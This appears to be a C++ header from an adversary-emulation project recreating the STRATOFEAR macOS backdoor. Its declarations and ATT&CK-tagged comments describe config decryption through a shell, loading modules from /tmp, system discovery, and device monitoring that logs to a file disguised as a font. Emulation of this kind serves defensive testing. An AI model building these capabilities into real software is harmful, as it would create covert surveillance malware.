#ifndef FUNCTIONS_H_INCLUDED
#define FUNCTIONS_H_INCLUDED
#include <iostream>
#include <string>
#include <sstream>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <unistd.h>
#include <cstdint>
#include <iomanip>
#include <random>
#include <dlfcn.h>
#include <cstdlib>
#include <CoreServices/CoreServices.h>
#include <ctime>

#include "XorLogger.hpp"
#include "module.hpp"

typedef char* func_ptr();

extern std::string CONFIG_PATH;
extern std::string CONFIG_FILENAME;

// struct to contain network information
struct Configuration{
    bool configured = false;
    bool registered = false;
    std::string domain;
    char UUID[3];
    char version[2];
};
/*
 * LoadConfig:
 *      About:
 *          Decrypts the configuration file with a System() command (T1059.004) using openssl enc, 
 *          dropping a decrypted configuration file to disk. STRATOFEAR then reads this file at 
 *          specific offsets and saves the configuration information (Domain information with port 
 *          & UUID) to a struct. STRATOFEAR looks for the network configuration file inside the 
 *          executable's directory. 
 *      Result:
 *          A decrypted network configuration file is dropped to disk and the domain, port, and UUID 
 *          are saved to a structure for reuse. Ensures the configuration file was decrypted, 
 *          information parsed, and saved to a struct.
 *      Returns:
 *          Boolean true if the configuration was loaded successfully, false if an error occurred 
 *      MITRE ATT&CK Techniques:
 *          T1036.008: Masquerading: Masquerade File Type 
 *          T1140: Deobfuscate/Decode Files or Information 
 *          T1059.004: Command and Scripting Interpreter: Unix Shell 
 *      CTI:
 *          https://www.mandiant.com/resources/blog/north-korea-supply-chain
 * 
 */
Configuration LoadConfig();

/*
* createModuleFile():
*      About:
*           Creates a .tmp file on disk using 6 randomly generated alphanumeric characters for 
*           the filename.
*      Result:
*           creates a file with a randomly generated name on disk in the /tmp folder
*      Returns:
*           Path of the file
*      CTI:
*           https://www.mandiant.com/resources/blog/north-korea-supply-chain
*           https://www.jamf.com/blog/threat-hunting-unraveling-malware-tactics/ 
*/ 
std::string createModuleFile(const std::vector<unsigned char>& moduleBytes);

/*
* executeModule():
*      About:
*           Uses dlopen() & dlsym to load a file and execute a shared library.
*           Clears and un-sets the "fn" & "ffn" environment variables
*      Result:
*           Executes functionality contained in the loaded module
*      Returns:
*           bool for success or failure
*      MITRE ATT&CK Techniques:
*           T1129: Shared Modules 
*      CTI:
*           https://www.mandiant.com/resources/blog/north-korea-supply-chain
*           https://www.jamf.com/blog/threat-hunting-unraveling-malware-tactics/ 
*/        
char* executeModule(std::string filepath);
/*
* generateFilename():
*      About:
*           Returns a filename string 6 randomly generated alphanumeric characters for 
*           the filename with the `.tmp` suffix
*      Result:
*           Creates a random string
*      Returns:
*           returns a randomly generated string ending in `.tmp`
*      CTI:
*           https://www.mandiant.com/resources/blog/north-korea-supply-chain
*           https://www.jamf.com/blog/threat-hunting-unraveling-malware-tactics/ 
*/      
std::string generateFilename();
/*
* collectSystemInfo():
*      About:
*           Collects local system information using `popen` to 
*           execute logname, system_profiler, sw_vers & dscl native utilities
*           Also calls gethostname()
*      Result:
*           Collects system users, hardware information, Operating 
*           System, and Build version
*      Returns:
*           Returns a string containing the discovery information 
*           about the local system
*      MITRE ATT&CK Techniques:
*           T1033 System Owner/User Discovery
*           T1082 System Information Discovery
*           T1059.004 Command and Scripting Interpreter: Unix Shell
*      CTI:
*           https://www.mandiant.com/resources/blog/north-korea-supply-chain
*           https://www.jamf.com/blog/threat-hunting-unraveling-malware-tactics/
*           https://www.sentinelone.com/blog/macos-malware-2023-a-deep-dive-into
*           -emerging-trends-and-evolving-techniques/ 
*/ 
std::string collectSystemInfo();
/*
* monitorDevices():
*      About:
*           Uses the File System Events framework (CoreServices.framework) to
*           install a monitor to the provided path, in this use case the 
*           `/Volumes` path is leveraged. `.dmg`, USB, and share drives
*           leverage the `/Volumes` folder.
*      Result:
*           Write events related to the provided path to the log file
*           /Library/Fonts/AppleSDGothicNeo.ttc.1.
*      MITRE ATT&CK Techniques:
*           T1119 Automated Collection
*           T1135 Network Share Discovery
*           T1082 System Information Discovery
*      CTI:
*           https://www.mandiant.com/resources/blog/north-korea-supply-chain
*/ 
void monitorDevices(const char* path);
#endif